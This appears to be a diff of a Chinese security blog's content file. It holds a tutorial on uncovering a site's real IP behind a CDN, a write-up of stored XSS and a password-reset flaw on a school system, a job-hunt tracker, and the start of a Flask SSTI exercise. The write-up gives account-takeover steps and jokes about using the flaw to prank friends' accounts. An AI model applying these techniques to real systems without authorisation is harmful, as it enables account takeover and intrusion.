+<h2 id="三-绕过CDN查找真实IP"><a href="#三-绕过CDN查找真实IP" class="headerlink" title="三. 绕过CDN查找真实IP"></a>三. 绕过CDN查找真实IP</h2><h3 id="1-查询子域名"><a href="#1-查询子域名" class="headerlink" title="1. 查询子域名"></a>1. 查询子域名</h3><p>由于CDN本身也不便宜, 再加上某些企业业务线众多, 所以很多站长可能只会对主站或者流量大的子站点做了 CDN, 而很多小站子站点又跟主站在同一台服务器或者同一个C段内, 此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP.<br>查询子域名的方法就很多了：</p>
+<ol>
+<li>各种子域名扫描器: subDomainsBrute、Sublist3r等</li>
+<li>Google hack</li>
+<li>还有某些网站可以进行查询。例如:<br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
+</ol>
+<h3 id="2-利用网站漏洞查询"><a href="#2-利用网站漏洞查询" class="headerlink" title="2. 利用网站漏洞查询"></a>2. 利用网站漏洞查询</h3><ol>
+<li>敏感文件泄漏, 比如: phpinfo之类的探针, Github信息泄漏, Apache status和Jboss status敏感信息泄露, 网页源代码泄露, svn信息泄露信、github信息泄露等。</li>
+<li>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如: XSS盲打、SSRF、命令执行反弹shell等。</li>
+<li>无论是用社工还是其他手段, 拿到了目标网站管理员在CDN的帐号, 从CDN的配置中找到网站的真实IP</li>
+</ol>
+<h3 id="3-查询历史DNS记录"><a href="#3-查询历史DNS记录" class="headerlink" title="3. 查询历史DNS记录"></a>3. 查询历史DNS记录</h3><p>查询ip与域名绑定的历史记录，可能会发现使用CDN之前的记录。相关查询网站有：</p>
+<ul>
+<li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>  DNS查询</li>
+<li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>  微步在线</li>
+<li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a>  在线域名信息查询</li>
+<li><a href="http://viewdns.info/">http://viewdns.info/</a>  DNS、IP等查询</li>
+<li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> CDN查询IP</li>
+<li><a href="http://www.17ce.com/">http://www.17ce.com/</a></li>
+<li><a href="https://community.riskiq.com/">https://community.riskiq.com/</a></li>
+<li><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></li>
+</ul>
+<h3 id="4-利用网站返回的内容寻找真实原始IP"><a href="#4-利用网站返回的内容寻找真实原始IP" class="headerlink" title="4. 利用网站返回的内容寻找真实原始IP"></a>4. 利用网站返回的内容寻找真实原始IP</h3><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
+<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
+<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
+<p>ga（’create’，’UA-93577176-1’，’auto’）;<br>可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
+<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。<br>搜索示例：<a href="https://www.shodan.io/search?query=http.html:UA-32023260-1">https://www.shodan.io/search?query=http.html%3AUA-32023260-1</a></p>
+<h3 id="5-Mx记录或邮件"><a href="#5-Mx记录或邮件" class="headerlink" title="5. Mx记录或邮件"></a>5. Mx记录或邮件</h3><p>很多站点都有发送邮件sendmail的功能, 如RSS邮件订阅等. 而且一般的邮件系统很多都是在内部, 没有经过CDN的解析. 查看邮件源码里面就会包含服务器的真实IP.</p>
+<h3 id="6-使用国外主机解析域名"><a href="#6-使用国外主机解析域名" class="headerlink" title="6. 使用国外主机解析域名"></a>6. 使用国外主机解析域名</h3><p>国内很多 CDN 厂商因为各种原因只做了国内的线路, 而针对国外的线路可能几乎没有, 通过国外的一些冷门的DNS或IP去请求目标, 通过国外代理访问就能查看真实IP了, 或者通过国外的DNS解析，可能就能得到真实的IP查询网站：</p>
+<ul>
+<li><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></li>
+</ul>
+<h3 id="7-利用Zgrab绕CDN找真实IP"><a href="#7-利用Zgrab绕CDN找真实IP" class="headerlink" title="7. 利用Zgrab绕CDN找真实IP"></a>7. 利用Zgrab绕CDN找真实IP</h3><p>通过信息收集，缩小扫描范围，确定一个相对小的IP和端口范围（中国？AS号？B段？等）<br>通过http指纹特征和keyword等做综合判断。可使用工具如下：</p>
+<ul>
+<li><a href="https://github.com/zmap/zgrab/">https://github.com/zmap/zgrab/</a></li>
+<li><a href="http://www.ipdeny.com/ipblocks/">http://www.ipdeny.com/ipblocks/</a></li>
+</ul>
+<p>zgrab是基于zmap无状态扫描的应用层扫描器,可以自定义数据包，以及ip、domain之间的关联。可用于快速指纹识别爆破等场景。<br>可参考这篇文章：<a href="https://link.zhihu.com/?target=https://levyhsu.com/2017/05/%25e5%2588%25a9%25e7%2594%25a8zgrab%25e7%25bb%2595cdn%25e6%2589%25be%25e7%259c%259f%25e5%25ae%259eip/">利用Zgrab绕CDN找真实IP - Levy Hsu</a></p>
+<h3 id="8-用-Zmap-扫全网"><a href="#8-用-Zmap-扫全网" class="headerlink" title="8. 用 Zmap 扫全网"></a>8. 用 Zmap 扫全网</h3><p>直接Zmap硬扫<br>可参考这篇文章：<a href="https://link.zhihu.com/?target=http://bobao.360.cn/learning/detail/211.html">简单获取CDN背后网站的真实IP - 安全客 - 有思想的安全新媒体</a><br>假如需要找 xiaix.me 网站的真实 IP, 我们首先从 apnic 获取 IP 段, 然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取, 最后在 http-req 中的 Host 写 xiaix.me。</p>
+<h3 id="9-网络空间引擎搜索法"><a href="#9-网络空间引擎搜索法" class="headerlink" title="9. 网络空间引擎搜索法"></a>9. 网络空间引擎搜索法</h3><p>比如 zoomeye、fofa、shodan<br>通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：</p>
+<ul>
+<li>特有的http头部（如server类型、版本、cookie等信息)、</li>
+<li>特定keyword（如title、css、js、url等）、</li>
+<li>特定的IP段搜索（如fofa支持C段搜索），</li>
+</ul>
+<p>有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。<br>以fofa为例，只需输入：<code>title:&quot;网站的title关键字&quot;</code> 或者 <code>body：&quot;网站的body特征&quot;</code> 就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip</p>
+<h3 id="10-利用SSL证书寻找真实原始IP"><a href="#10-利用SSL证书寻找真实原始IP" class="headerlink" title="10. 利用SSL证书寻找真实原始IP"></a>10. 利用SSL证书寻找真实原始IP</h3><p>此方法来自于去年CplusHua表哥在Freebuf公开课《HTTP盲攻击的几种思路》中分享的：<br>查询网站：</p>
+<ul>
+<li><a href="https://censys.io/">https://censys.io/</a><br>这个网址会将互联网所有的ip进行扫面和连接，以及证书探测。若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。<br><code>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com</code></li>
+</ul>
+<h3 id="11-F5-LTM-负载均衡解码获取真实内网ip"><a href="#11-F5-LTM-负载均衡解码获取真实内网ip" class="headerlink" title="11. F5 LTM 负载均衡解码获取真实内网ip"></a>11. F5 LTM 负载均衡解码获取真实内网ip</h3><p>参考文章: <a href="https://link.zhihu.com/?target=https://threathunter.org/topic/5940c85d9c58e020408a79fe">透过F5获取服务器真实内网IP - ThreatHunter</a><br>当服务器使用F5 LTM做负载均衡时, 通过对set-cookie关键字的解码真实ip也可被获取, 例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000, 先把第一小节的十进制数即487098378取出来, 然后将其转为十六进制数1d08880a, 接着从后至前，以此取四位数出来, 也就是0a.88.08.1d, 最后依次把他们转为十进制数10.136.8.29, 也就是最后的真实ip。</p>
+<h3 id="12-利用HTTP标头寻找真实原始IP"><a href="#12-利用HTTP标头寻找真实原始IP" class="headerlink" title="12. 利用HTTP标头寻找真实原始IP"></a>12. 利用HTTP标头寻找真实原始IP</h3><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
+<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
+<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
+<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下：<br>80.http.get.headers.server:cloudflare</p>
+]]></content>
+      <categories>
+        <category>信息收集</category>
+      </categories>
+      <tags>
+        <tag>CDN</tag>
+        <tag>IP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次挖掘edu src的过程</title>
+    <url>/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p>今天在群里和沙雕网友唠嗑，正好聊到了网络安全上面。于是打算展示点与网络安全相关的东西给群友们看看。就拿群友的学校开刀试试。</p>
+<p>所有漏洞已提交给edu-src。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先收集一下子域名，为了方便起见，直接使用<a href="https://phpinfo.me/domain/">在线子域名查询</a></p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86.png" class="" title="子域名收集">
+
+<p>逐个查看，找到了三个登录地址。简单测试一下，不能用万能密码进入。这时候发现其中有一个登录地址存在注册功能。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>注册一个账号，进去之后发现可以编辑个人信息</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/edit.jpg" class="" title="编辑个人信息">
+
+<p>测一下有没有存储型xss，如果有的话就可以利用申请项目来让管理员查看我的个人信息。然后就可以盗取管理员的cookie</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/payload.jpg" class="" title="payload">
+
+<p>打入xss的payload，保存输入的信息，可以看到成功触发payload</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/1.jpg" class="" title="payload">
+
+<p>作为一个遵纪守法的好公民，就不深入利用了。</p>
+<h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><p>一个存储型XSS显然是不够在群里吹水的，在这个平台上面翻来覆去的看看有没有什么漏掉的功能。</p>
+<p>这时候突然在burp看到一个数据包</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/before.png" class="" title="忘记密码">
+
+<p>在忘记密码这个功能这里，程序会发送验证码到注册用的手机号上面</p>
+<p>于是想，把数据包里面的手机号码，改成其他手机号。会不会把验证码发到其他手机上</p>
+<p>又去注册了一个测试用的账号，这下就有两个帐号了，两个账号分工一下：</p>
+<ul>
+<li>目标账号（188xxxxx519）</li>
+<li>攻击者账号（173xxxxx676）</li>
+</ul>
+<p>理一下攻击思路：</p>
+<ol>
+<li>利用忘记密码的功能，尝试更改目标账号（188xxxxx519）的密码</li>
+<li>开启burp，点击发送验证码，拦截该数据包。</li>
+<li>将数据包中的目标账号（188xxxxx519）修改为攻击者账号（173xxxxx676）然后发送数据包</li>
+<li>原本应该发送给目标账号（188xxxxx519）的验证码信息有可能直接发送到攻击者账号（173xxxxx676）的手机上</li>
+<li>利用收到的验证码，就可以更改目标账号（188xxxxx519）的用户密码</li>
+</ol>
+<p>说干就干<br>首先输入我们要攻击的目标账号</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/%E7%9B%AE%E6%A0%87.png" class="" title="输入要攻击的目标账号">
+
+<p>然后利用burp拦截发送验证码的数据包，将phone处的数据修改为攻击者账号之后发送数据包。</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/after.png" class="" title="修改phone">
+
+<p>可以看到成功将验证码发送到攻击者手机上，这是个好兆头</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/success.png" class="" title="发送成功">
+
+<p>等待一会儿，从攻击者手机上收到发送过来的验证码。到这里基本已经成功了</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/phone.png" class="" title="收到验证码">
+
+<p>然后利用收到的验证码，去更改目标账户的验证码</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/%E6%94%B9.png" class="" title="更改密码">
+
+<p>利用更改过后的密码尝试登录<br>可以看到成功登录进去</p>
+<img src="/2021/08/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98edu-src%E7%9A%84%E8%BF%87%E7%A8%8B/%E6%88%90%E5%8A%9F.png" class="" title="成功登录">
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>我个人用的一个简单的挖掘思路，从收集子域名，到找寻敏感功能点（诸如登录，教务处，项目管理平台，微信小程序），再到测试输入点看看会不会有常见的web漏洞。然后猜测程序背后的逻辑关系来挖掘逻辑漏洞。多想一想如果这个网站是自己写的，可能会在哪里出现逻辑问题。</p>
+<p>另外，在edu-src上看到一位前辈的挖掘思路无比牛。他直接想办法寻找网站的源代码。开源的框架就直接官方找，不开源的框架就用fofa查询与目标站点采用相同框架的其他站点，然后看看这些站点里面有没有开发者忘记删掉的备份文件。拿到代码之后，直接审计源代码挖掘0day，然后写POC批量打。</p>
+<p>这种打法是真的牛，奈何我代码功底薄弱，审计代码的能力太弱了。等以后功夫再深一点，也学习一下这位前辈的打法。</p>
+<p>（这次挖掘就到这里，可以用这个逻辑漏洞去修改沙雕群友的项目系统的账号密码了，小小的整蛊一下。）</p>
+]]></content>
+      <categories>
+        <category>漏洞挖掘</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+        <tag>逻辑漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录漫长的求职之路</title>
+    <url>/2021/09/16/%E8%AE%B0%E5%BD%95%E6%BC%AB%E9%95%BF%E7%9A%84%E6%B1%82%E8%81%8C%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<h2 id="应届生招聘日程表"><a href="#应届生招聘日程表" class="headerlink" title="应届生招聘日程表"></a>应届生招聘日程表</h2><blockquote>
+<p>记录格式如下<br>公司 投递日期</p>
+</blockquote>
+<p>1.奇安信 2021-8-26</p>
+<ul>
+<li><input disabled="" type="checkbox"> Web安全工程师 （成都）  2021-8-26<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-7</li>
+</ul>
+</li>
+<li><input disabled="" type="checkbox"> 渗透测试工程师（A-Team）2021-9-12</li>
+</ul>
+<p>2.西山居游戏 2021-9-7</p>
+<ul>
+<li><input disabled="" type="checkbox"> 【校招】信息安全工程师 （珠海）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-11</li>
+<li><input checked="" disabled="" type="checkbox"> 面试 2021-10-13 （推掉）</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>3.小米 2021-9-8</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全攻防工程师 （北京） <ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-8</li>
+</ul>
+</li>
+</ul>
+<p>4.拼多多 2021-9-8</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （上海）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-22 下午三点</li>
+<li><input checked="" disabled="" type="checkbox"> 一面 2021-10-15 （推掉）</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>5.字节跳动 2021-9-8</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师—安全与风控 （杭州）</li>
+</ul>
+<p>6.360集团 2021-9-8</p>
+<ul>
+<li><input disabled="" type="checkbox"> Web安全工程师 （北京）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-25</li>
+</ul>
+</li>
+</ul>
+<p>7.vivo 2021-9-8</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程管理工程师</li>
+</ul>
+<p>8.盛趣 2021-9-9</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全（安全工程师） （上海）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-19</li>
+<li><input checked="" disabled="" type="checkbox"> 初试 （技术面） 2021-9-23</li>
+<li><input checked="" disabled="" type="checkbox"> 复试 2021-10-14 （推掉）</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>9.58同城 2021-9-9</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 安全工程师 （北京） <ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-11</li>
+<li><input checked="" disabled="" type="checkbox"> 初试 （技术面） 2021-9-17</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>10.Shopee 2021-9-9</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 【2022秋招】 安全研究工程师 （深圳）<ul>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>11.顺丰 2021-9-12</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师（顺丰科技）</li>
+</ul>
+<p>12.腾讯 2021-9-12</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全技术 （上海）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-25</li>
+</ul>
+</li>
+</ul>
+<p>13.斗鱼 2021-9-12</p>
+<ul>
+<li><input disabled="" type="checkbox"> 应用安全工程师 （武汉）</li>
+</ul>
+<p>14.快手 2021-9-12</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 安全工程师 （北京）<ul>
+<li><input checked="" disabled="" type="checkbox"> 无笔试环节</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>15.微步在线 2021-9-12</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全研究员 （北京）<ul>
+<li><input checked="" disabled="" type="checkbox"> 无笔试环节 2021-9-30</li>
+<li><input checked="" disabled="" type="checkbox"> 初试 （技术面） 2021-9-30</li>
+<li><input checked="" disabled="" type="checkbox"> 复试 （HR面） 2021-9-30</li>
+<li><input checked="" disabled="" type="checkbox"> 一面 （技术面） 2021-10-9</li>
+<li><input checked="" disabled="" type="checkbox"> 二面 （技术面） 2021-10-9</li>
+<li><input checked="" disabled="" type="checkbox"> 三面 （leader面） 2021-10-9</li>
+<li><input checked="" disabled="" type="checkbox"> offer 2021-10-15</li>
+<li><input checked="" disabled="" type="checkbox"> 但行好事，莫问前程</li>
+</ul>
+</li>
+</ul>
+<p>16.百度 2021-9-14</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （深圳）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-22</li>
+</ul>
+</li>
+</ul>
+<p>17.OPPO 2021-9-15</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师 （成都、深圳）</li>
+</ul>
+<p>18.携程 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 基础安全工程师 （上海）</li>
+</ul>
+<p>19.米哈游 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师 （上海）</li>
+</ul>
+<p>20.猿辅导 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 应用安全工程师 （北京）</li>
+</ul>
+<p>21.聚水潭 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （上海）</li>
+</ul>
+<p>22.叮咚买菜 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师 （上海）</li>
+</ul>
+<p>23.Keep 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （北京）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-22</li>
+<li><input checked="" disabled="" type="checkbox"> 一面 （技术面） 2021-10-12</li>
+</ul>
+</li>
+</ul>
+<p>24.货拉拉 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师 （深圳）</li>
+</ul>
+<p>25.美团 2021-9-16</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 安全工程师 （北京、上海）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-18</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>26.东方财富信息股份有限公司 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师 （上海）</li>
+</ul>
+<p>27.昆仑万维 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师-NanoBank （北京）</li>
+</ul>
+<p>28.Zoom 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 应用安全工程师 （苏州）</li>
+</ul>
+<p>29.中新赛克 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 网络安全工程师 （南京）</li>
+</ul>
+<p>30.兴业数金 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 校园网络运维工程师 （上海）</li>
+</ul>
+<p>31.网易 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （杭州）</li>
+</ul>
+<p>32.知乎 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （北京）</li>
+</ul>
+<p>33.微众银行 2021-9-16</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 【校招】信息安全工程师-安全攻防方向 （深圳）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-9-23</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>34.TCL 2021-9-16</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师 （深圳）</li>
+</ul>
+<p>35.虎牙 2021-9-30</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （北京）</li>
+</ul>
+<p>36.有赞 2021-10-1</p>
+<ul>
+<li><input disabled="" type="checkbox"> 信息安全工程师 （杭州）<ul>
+<li><input checked="" disabled="" type="checkbox"> 一面 2021-10-13 （推掉）</li>
+<li><input checked="" disabled="" type="checkbox"> 终止</li>
+</ul>
+</li>
+</ul>
+<p>37.网宿科技 2021-10-1</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全研究工程师 （厦门）</li>
+</ul>
+<p>38.字节跳动 2021-10-1</p>
+<ul>
+<li><input disabled="" type="checkbox"> 渗透测试工程师-安全与风控 （杭州）</li>
+</ul>
+<p>39.Bilibili 2021-10-2</p>
+<ul>
+<li><input disabled="" type="checkbox"> 基础安全工程师 （上海）<ul>
+<li><input checked="" disabled="" type="checkbox"> 笔试 2021-10-13</li>
+</ul>
+</li>
+</ul>
+<p>40.爱奇艺 2021-10-2</p>
+<ul>
+<li><input disabled="" type="checkbox"> 安全工程师 （北京）</li>
+</ul>
+<h2 id="校园宣讲"><a href="#校园宣讲" class="headerlink" title="校园宣讲"></a>校园宣讲</h2><p>1.海康威视</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 校园宣讲 2021-9-17 下午</li>
+</ul>
+<p>2.成都市公安局</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 校园宣讲 2021-9-23 上午</li>
+</ul>
+<p>3.安恒</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 校园宣讲 2021-9-23 下午</li>
+</ul>
+<p>4.绿盟</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 校园宣讲 2021-9-24 上午</li>
+</ul>
+<p>5.科来</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 校园宣讲 2021-9-24 下午</li>
+</ul>
+<p>6.微步在线</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 校园宣讲 2021-9-28 下午</li>
+</ul>
+<p>7.中国网安</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 校园宣讲 2021-9-29 下午</li>
+</ul>
+<h2 id="保留目标"><a href="#保留目标" class="headerlink" title="保留目标"></a>保留目标</h2><p>1.工行四川分行</p>
+<ul>
+<li><input disabled="" type="checkbox"> 截止日期 2021-10-10</li>
+</ul>
+<p>2.深信服</p>
+<ul>
+<li><input disabled="" type="checkbox"> 截止日期 2021-10-15</li>
+</ul>
+<p>3.金山云</p>
+<ul>
+<li><input disabled="" type="checkbox"> 截止日期 2021-10-31</li>
+</ul>
+<p>4.TT语音</p>
+<ul>
+<li><input disabled="" type="checkbox"> 截止日期 2021-10-31</li>
+</ul>
+<p>5.贝壳<br>6.蚂蚁集团<br>7.荣耀<br>8.安恒<br>9.阿里<br>10.华为</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>归档</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一道典型的flask SSTI题目</title>
+    <url>/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/</url>
+    <content><![CDATA[<h2 id="一、概念了解及环境搭建"><a href="#一、概念了解及环境搭建" class="headerlink" title="一、概念了解及环境搭建"></a>一、概念了解及环境搭建</h2><h3 id="1-一些新概念"><a href="#1-一些新概念" class="headerlink" title="1. 一些新概念"></a>1. 一些新概念</h3><ol>
+<li>PyCharm是一种Python IDE，带有一整套可以帮助用户在使用Python语言开发时提高其效率的工具，比如调试、语法高亮、Project管理、代码跳转、智能提示、自动完成、单元测试、版本控制。此外，该IDE提供了一些高级功能，以用于支持Django框架下的专业Web开发。</li>
+<li>IDE: 集成开发环境(Integrated Development Environment)是用于提供程序开发环境的应用程序。简单来说就是提高程序员开发效率的东西。</li>
+<li>web服务器, 应用服务器：处理逻辑的服务器，处理php,python,不能直接通过nginx这种web服务器来处理。eg, uwsgi处理Python;</li>
+<li>常见web应用框架: flask, django</li>
+</ol>
+<h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h3><p>工具准备：python3 &amp; PyCharm</p>
+<p>1.flask搭建过程</p>
+<p>1.安装python3虚拟环境</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m venv venv  --&gt; 安装虚拟环境（第二个venv指虚拟环境的名字）</span><br><span class="line">venv\Scripts\activate --&gt; 启动虚拟环境</span><br><span class="line">deactivate            --&gt; 关闭虚拟环境</span><br></pre></td></tr></table></figure>
+
+<p>安装虚拟环境主要是为了不让flask测试框架所安装的一些python模块, 影响自己本机的python环境。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install Flask                   --&gt;  pip版本过低</span><br><span class="line">python -m pip install --upgrade pip --&gt;  更新pip版本</span><br><span class="line">pip install Flask                   --&gt;  成功安装Flask</span><br><span class="line">pip list                            --&gt;  python所安装模块查询版本成功√</span><br></pre></td></tr></table></figure>
+
+<p>2.PyCharm使用:<br>File –&gt; New Project 创建一个新项目<br>File –&gt; Settings –&gt; Project:Project Interpreter 设置python路径, 然后选择pip然后可以安装python相应模块</p>
+<p>参考文章: </p>
+<ol>
+<li>《pycharm使用教程看这篇就足够了》 <a href="https://www.jianshu.com/p/2a4d388b86e9">https://www.jianshu.com/p/2a4d388b86e9</a></li>
+</ol>
+<h2 id="二、flask框架学习"><a href="#二、flask框架学习" class="headerlink" title="二、flask框架学习"></a>二、flask框架学习</h2><p><strong>一、用flask写一个hello world:</strong></p>
